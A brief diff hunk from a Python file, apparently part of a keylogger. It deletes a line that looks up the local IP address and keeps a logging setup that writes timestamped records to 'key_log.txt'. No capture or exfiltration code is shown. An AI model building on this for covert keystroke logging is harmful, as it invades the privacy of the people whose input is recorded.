@@ -9,8 +9,6 @@ import os
 import socket
 import datetime
 
-myip = socket.gethostbyname(socket.gethostname())
-
 log_dir = ""
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
